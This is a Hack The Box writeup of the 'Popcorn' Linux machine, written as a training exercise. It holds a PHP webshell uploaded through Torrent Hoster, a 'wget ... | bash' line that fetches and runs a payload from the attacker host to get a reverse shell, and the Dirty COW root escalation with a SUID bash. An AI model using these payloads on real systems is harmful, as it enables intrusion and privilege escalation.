---
layout: post
title:  "Popcorn Writeup - Hack The Box"
date:   2025-08-29
desc: ""
keywords: "HTB,eJPT,eWPT,Linux,File Upload Vulnerability,PHP-RCE,Kernel Exploitation,DirtyCow,Medium"
categories: [HTB]
tags: [HTB,eJPT,eWPT,Linux,File Upload Vulnerability,PHP-RCE,Kernel Exploitation,DirtyCow,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I start a new **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine in which the exploitation of the vulnerability took me a long time, but not because of its complexity but because **I was unfocused** and **lost a lot of time** in understanding the **correct technique** to apply. This lab is a clear example that if I'm not rigorous with myself in the task of the **Engagement** of the same, I can omnuvilarme and find the attack vector but not exploit it correctly. The box is rated as **Medium** and I agree with the rating as you must have some knowledge in web exploitation. I'm going to access the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform to spawn the machine and start my next writeup.

<br /><br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I verify that the connection to the machine through the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** VPN is already established, to do this, I use the `ping` tool to send a trace and ensure that the box receives it correctly. Then I can establish that the operating system I'm going to deal with is **Linux**, and I can find this out thanks to `whichSystem.py`, a **[hack4u](https://hack4u.io/){:target="_blank"}** tool that takes advantage of the **TTL** value. Now I can start the **Reconnaissance** phase with `nmap`. The first step is to list the open ports using the **TCP SYN scan** method and then use the custom `nmap` scripts to leak all possible information about the available services and their versions. Among all the information collected, I find a **domain name**, but it also allows me to know the **codename** (if I find different values, it is an indication that containers may be implemented) of the machine. I continue my tasks and choose the web application, which always presents the largest attack surface due to the possibility of interacting with it, to disclose with `whatweb` the technology stack behind the application. On the first attempt, an error is generated because I have to add the domain to my **hosts** file. Once I make the necessary changes, I can leak information from the service, even with **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** from the browser.

```bash
ping -c 2 10.10.10.6
whichSystem.py 10.10.10.6
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.6 -oG allPorts
nmap -sCV -p22,80 10.10.10.6 -oN targeted
cat targeted
#         --> OpenSSH 5.1p1 Debian 6ubuntu2
#         google.es --> OpenSSH 5.1p1 6ubuntu2 launchpad      Karmic
#         --> Apache httpd 2.2.12
#         google.es --> Apache httpd 2.2.12 launchpad         Karmic
#         http://popcorn.htb/

whatweb http://10.10.10.6
nvim /etc/hosts
cat /etc/hosts | tail -n 1
cat /etc/hosts | tail -n 1 | awk 'NF{print $NF}'
cat /etc/hosts | tail -n 1 | awk 'NF{print $NF}' | xargs ping -c 1

whatweb http://10.10.10.6
# http://popcorn.htb/
```

<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The website informs me that it does not yet have any content, so I'm going to use an `nmap` script to perform an initial fingerprinting of the web server in search of hidden content, but it does not leak any sensitive information. To optimize the search, I'm going to use a specialized tool, `wfuzz`, which make a file and web directory discovery in a matter of seconds. In one of the files, I find information about **PHP** technology (**version**), but the web server also has **[CGI-BIN](https://www.liquidweb.com/blog/what-is-cgi-bin/){:target="_blank"}** enabled, so it may be vulnerable to a **[ShellShock attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html?highlight=cgi-bin#old-php--cgi--rce-cve-2012-1823-cve-2012-2311){:target="_blank"}**. I perform a new search with `wfuzz` for directories and **.cgi** files related to **[CGI-BIN](https://www.liquidweb.com/blog/what-is-cgi-bin/){:target="_blank"}**, but I do not succeed in leaking anything. In another of the hidden directories I found, **Torrent Hoster** technology is accessible.

> **[CGI](https://www.liquidweb.com/blog/what-is-cgi-bin/){:target="_blank"}** stands for **Common Gateway Interface** and is the pathway that your requests, scripts in this case, communicate with your hosting server. **CGI** programs interact with the **Hypertext Transfer Protocol** (**HTTP**) and with **Hypertext Markup Language** (**HTML**) in general. **CGI** acts as a pathway for information sharing between the server and the application.

```bash
nmap --script http-enum -p80 10.10.10.6 -oN webScan
nmap --script http-enum -p80 10.10.10.6 -oN webScan -Pn

# http://popcorn.htb/index.html
# :)
# http://popcorn.htb/index.php
# :(

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://popcorn.htb/FUZZ/

# http://popcorn.htb/test

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://popcorn.htb/cgi-bin/FUZZ/
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://popcorn.htb/cgi-bin/FUZZ.cgi

# http://popcorn.htb/torrent/
```

<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since the **Torrent Hoster** application allows me to register, I can create a new account to investigate this tool in more depth, thus avoiding having to bypass the login panel. Once I access the website's home page, I can see that the application is **BitTornado**, a **[BitTorrent](https://www.kaspersky.com/resource-center/definitions/bittorrent){:target="_blank"}** client, and I can also find various articles related to this technology. There is a feature that would allow me to upload a new **torrent** file, which I take advantage of to perform a test and attempt to upload a text file that is rejected because it is not a **torrent** file.

> **[BitTorrent](https://www.kaspersky.com/resource-center/definitions/bittorrent){:target="_blank"}** is an internet transfer protocol. Much like **HTTP** (hypertext transfer protocol) and **FTP** (file transfer protocol), **BitTorrent** is a way to download files from the internet. However, unlike **HTTP** and **FTP**, **BitTorrent** is a distributed transfer protocol.

> **BitTornado** is a **BitTorrent client**: It is developed by **John Hoffman**, who also created its predecessor, **Shad0w's Experimental Client**. Based on the original **BitTorrent client**, the interface is largely the same, with added features such as: **upload/download speed** limitation prioritised downloading when downloading batches (several files) detailed information about connections to other **peers UPnP Port Forwarding** (Universal Plug and Play) IPv6 support (if your OS supports it/has it installed) PE/MSE support as of version 0.3.18.

```bash
# http://popcorn.htb/torrent/

# http://popcorn.htb/torrent/torrents.php?mode=upload
echo 'oldboy was here' > test.txt
```

<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `searchsploit` I search for a **[Torrent Hoster vulnerability](https://packetstorm.news/files/2010-03/25){:target="_blank"}** that has an exploit in my local **Exploit-DB** database and I find one that would allow me to upload malicious content. I go to investigate the exploit code to not download it yet on my machine and I find the vulnerable **URL**, my idea is to perform the exploit manually so I use the **Torrent Hoster** application to upload a **[test torrent](https://sample-file.bazadanni.com/2012/01/torrent.html){:target="_blank"}** file, and it immediately redirects me to the configuration tab of the file I managed to upload. There is the possibility of modifying the default image of the **Screenshots** that the application uses, I take the opportunity to investigate the path where the images are stored.

```bash
searchsploit torrent hos
searchsploit -x php/webapps/11746.txt

# http://popcorn.htb/torrent/torrents.php?mode=upload
# http://popcorn.htb/torrent/torrents.php?mode=details&id=d0d14c926e6e99761a2fdcff27b403d96376eff6
# http://popcorn.htb/torrent/upload/noss.png
```

<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to resort to the great **BurpSuite** tool to capture the requests sent to the server and investigate how I can upload malicious content that will allow me to leak sensitive information or even exploit an **RCE**. My first test is to upload an image file and inject **PHP** code directly into the body of the code that represents the image, the file uploads correctly and I can access it from my browser but the code was not interpreted because the image is displayed correctly and I can't find the output of the command in the source code either.

```bash
burpsuite &> /dev/null & disown

cp ~/Downloads/pwn3d.jpeg .
# http://popcorn.htb/torrent/upload/d0d14c926e6e99761a2fdcff27b403d96376eff6.jpeg
# http://popcorn.htb/torrent/torrents.php?mode=details&id=d0d14c926e6e99761a2fdcff27b403d96376eff6

# <?php system("whoami"); ?>
# http://popcorn.htb/torrent/upload/d0d14c926e6e99761a2fdcff27b403d96376eff6.php
# view-source:http://popcorn.htb/torrent/download/d0d14c926e6e99761a2fdcff27b403d96376eff6.php
```

<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to try other basic techniques to try that the malicious code can be interpreted by the server, now I upload the image but I modify the extension with **BurpSuite** and without modifying the **Content-Type** header that indicates that the file is an image. I get the file to load but I still don't see the output of the command, although this time I notice in the message sent by the web server that there is a **syntax error** so I think I have found the **attack vector**. My next test is to upload a **.php** file directly but I corroborate that there is some protection measure that does not allow it, because of my **lack of concentration** I do not find the right way to exploit the vulnerability.

```bash
nvim test.php
cat !$
```

> **test.php**:

```php
<?php system("whoami"); ?>
```

```bash
# filename="pwn3d_1.php"
# Content-Type: application/x-php
# <?php system($_REQUEST["cmd"]); ?>
```

<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I keep **trying harder** to find the correct way to execute the command, I upload an image again but with **BurpSuite** I modify the extension and the **Content-Type** header of the image before injecting the malicious **PHP** code, but when accessing the image from the browser I get again a syntax error message and this time the file is not displayed because it is corrupted, I can't find the output of the command in the source code either. If I perform the same steps again but only modifying the file extension I fail again in the interpretation of the malicious command.

```bash
burpsuite &> /dev/null & disown

# filename="pwn3d_1.php"
# Content-Type: application/x-php
# <?php system($_REQUEST["cmd"]); ?>
# Invalid file    :(

# http://popcorn.htb/torrent/edit.php?mode=edit&id=d0d14c926e6e99761a2fdcff27b403d96376eff6

# filename="pwn3d_1.php"
# Content-Type: image/jpeg
# <?php system($_REQUEST["cmd"]); ?>
```

<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

My frustration management level is about to be exceeded so I'm going to use **BurpSuite's Repeater** feature to gain more control and speed up my attacks. Once I load the image again, this time I redirect the intercepted request to the **Repeater** where I start applying the techniques I know but with a higher level of concentration. First I try to modify the extension and the image loads without problems, then I modify the **Content-Type** header but obviously it doesn't let me. The next thing I do is to change the extension to **.php**, not to modify the **Content-Type** and replace all the content that represents the image by the **PHP** code of a **webshell**, and I manage to upload the malicious file. I still do not observe the output of the commands but before getting frustrated again, I use `ping` to send a trace to my attacking machine and I manage to sniff the packets with `tcpdump`, I had been right from the beginning and I had not realized.

```bash
# Repeater
# filename="pwn3d_0.php"                                                                          :)
# filename="pwn3d_0.php" && Content-Type: application/x-php                                       :(
# filename="pwn3d_3.php" && Content-Type: image/jpeg && <?php shell_exec($_REQUEST["cmd"]); ?>    :)
# http://popcorn.htb/torrent/upload/d0d14c926e6e99761a2fdcff27b403d96376eff6.php?cmd=whoami

tcpdump -i tun0 icmp -n
# http://popcorn.htb/torrent/upload/d0d14c926e6e99761a2fdcff27b403d96376eff6.php?cmd=ping%20-c%201%2010.10.14.10
```

<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have achieved an **RCE** I can try to use an **[PentesMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** oneliner to send a **Reverse Shell** to my machine and catch it with `nc` on port **443**. I manage to access the system and before starting the **Enumeration** phase I do a **console treatment** to have a better performance on the **shell** I got. With my first basic enumeration commands I find information that for the moment does not give me much help to **escalate privileges**, although I find the hash of a password and I can access the first flag. I confirm that the **codename** is **karmic** but the most interesting thing is the Linux kernel version (**popcorn 2.6.31**) which happens to be the name of the box, maybe that's the **clue** I'm needing.

> **Attacker Machine**:

```bash
nc -nlvp 443

# http://10.10.10.6/torrent/upload/82482dc47b331a292828af3cf0822b5d591686d4.php?cmd=wget -qO- http://10.10.14.12 |bash
```

> **Victime Machine**:

```bash
script /dev/null -c bash
# [Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

cat th_database.sql
# INSERT INTO `users` VALUES (3, 'Admin', '1844156d4166d94387f1a4ad031ca5fa', 'admin', 'admin@yourdomain.com', '2007-01-06 21:12:46', '2007-01-06 21:12:46');

uname -a
lsb_release -a
```

<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `searchsploit` I search for a vulnerability for the kernel version I found but I don't find any. If I do some research on the **Internet** with the search engine I do find an exploit called **[Dirty COW](https://www.exploit-db.com/exploits/40839){:target="_blank"}** that exploits a **[Race Condition](https://www.redhat.com/en/blog/understanding-and-mitigating-dirty-cow-vulnerability){:target="_blank"}** for kernel versions prior to **2.6.22** of **Linux**, which I can now search for with `searchsploit` and download the source code written in **C** on my attacking machine. I analyze the code and there are the hardcoded instructions to perform the exploit, confirm that `gcc` is available on the target machine, then transfer the exploit to compile it and give execution permissions to the generated binary. I only need to execute it so that the exploit takes care of exploiting the **Race Condition** and thus modify the **passwd** file to create a user with maximum privileges. I just have to perform a **user pivoting** to the new account to enable the **SUID** bit of the `bash` shell, recover the backup of the **passwd** file (**good practice**) and run the `bash` shell in privileged mode. This way I have successfully engaged the box and gained access to the last flag.

> **[Dirty Cow](https://www.redhat.com/en/blog/understanding-and-mitigating-dirty-cow-vulnerability){:target="_blank"}** works by creating a **race condition** in the way the **Linux kernel's** memory subsystem handles **copy-on-write** (**COW**) breakage of private read-only memory mappings. This **race condition** can allow an unprivileged local user to gain write access to read-only memory mappings and, in turn, increase their privileges on the system.

> **Attacker Machine**:

```bash
searchsploit popcorn

searchsploit dirty cow /etc/passwd
searchsploit -m linux/local/40839.c
mv 40839.c dirty_cow.c
python3 -m http.server 80
```

> **Victime Machine**:

```bash
cd /dev/shm
which gcc
wget http://10.10.14.10/dirty_cow.c
gcc -pthread dirty_cow.c -o dirty -lcrypt
chmod +x dirty

./dirty
su firefart
whoami
id
# groups=0(root)
groups
# root
ls -l /bin/bash
# -rwxr-xr-x
chmod u+s /bin/bash
ls -l /bin/bash
# -rwsr-xr-x      :)

mv /tmp/passwd.bak /etc/passwd
exit

bash -p
```

<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> What a great experience I had with this **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, where I was able to re-exploit vulnerabilities that I had encountered in labs some time ago. Although **I made the mistake** of not paying attention to my instinct when I found the attack vector, even when I was applying the techniques correctly **I did not know how to interpret the results** I was getting, this taught me that I should always be concentrated and focused on the **Engagement** of the box in each phase, mainly the **Reconnaissance** phase. I'm going to kill the box to continue with my next challenge of the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform.

<br /><br />
<img src="{{ site.img_path }}/popcorn_writeup/Popcorn_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
